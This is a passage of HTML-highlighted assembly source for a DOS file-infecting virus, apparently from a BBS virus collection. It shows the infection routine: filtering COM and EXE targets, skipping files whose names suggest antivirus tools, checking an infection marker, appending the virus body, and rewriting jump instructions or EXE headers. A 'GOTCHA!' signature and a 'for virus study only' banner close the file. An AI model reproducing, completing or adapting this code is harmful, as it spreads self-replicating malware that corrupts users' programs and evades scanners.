                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2A</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">

</span><span class="sc5">not_exe</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close1v</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2A</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_name</span><span class="sc0">
</span><span class="sc5">close1v</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close1</span><span class="sc0">

</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc12">'V'</span><span class="sc0">    </span><span class="sc1">;name is V*.* ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc12">'F'</span><span class="sc0">    </span><span class="sc1">;name is F*.* ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">;name is *SC*.* ?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CS'</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">SCloop</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">SCloop</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close1v</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;open for read/write</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;clear attributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;goto signature</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">goto</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save old offset</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">                 </span><span class="sc1">;read signature</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'!A'</span><span class="sc0">      </span><span class="sc1">;already infected?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close2v</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gotobegin</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc0">               </span><span class="sc1">;read begin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3F</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">5A4Dh</span><span class="sc0">     </span><span class="sc1">;EXE ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_EXE</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">4D5A</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">do_EXE</span><span class="sc0">

</span><span class="sc5">do_COM</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">BUFLEN</span><span class="sc4">],</span><span class="sc5">COMSIGN</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">0FC</span><span class="sc0"> </span><span class="sc1">;check length</span><span class="sc0">
                </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writeprog</span><span class="sc0">               </span><span class="sc1">;write program to end of file</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">      </span><span class="sc1">;JMP xxxx'</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getoldlen</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">BUFLEN</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done</span><span class="sc0">
</span><span class="sc5">close2v</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">close2</span><span class="sc0">

</span><span class="sc5">do_EXE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">BUFLEN</span><span class="sc4">],</span><span class="sc5">EXESIGN</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writeprog</span><span class="sc0">               </span><span class="sc1">;write program to end of file</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">                  </span><span class="sc1">;calculate new length </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">                 </span><span class="sc1">;put new length in header</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getoldlen</span><span class="sc0">               </span><span class="sc1">;calculate new CS &amp; IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0010</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;put CS in header</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;put IP in header</span><span class="sc0">


</span><span class="sc5">done</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gotobegin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc0">               </span><span class="sc1">;write new begin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">close2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;restore old offset in file</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">goto</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">      </span><span class="sc1">;no time-change</span><span class="sc0">

</span><span class="sc5">close1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">40</span><span class="sc0">      </span><span class="sc1">;no EOF on next close</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;restore attribute &amp; open-mode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore int24 vector</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore ctrl-break flag</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Get original length of program</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">getoldlen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">FILELEN</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Get length of program</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">getlen</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Goto new offset DX:AX</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">gotobegin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc9">goto</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Write virus to the file</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">writeprog</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getlen</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">goto</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FILELEN</span><span class="sc0">              </span><span class="sc1">;write virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">;are all bytes written?</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Text and Signature</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">envstring</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'E=mc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">signature</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GOTCHA!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;I have got you!  :-)</span><span class="sc0">

</span><span class="sc5">oi21</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">cseg</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">begin</span><span class="sc0">

</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">

</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;&gt; and Remember Don't Forget to Call &lt;;</span><span class="sc0">
</span><span class="sc1">;&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">

</span></div></body>
</html>
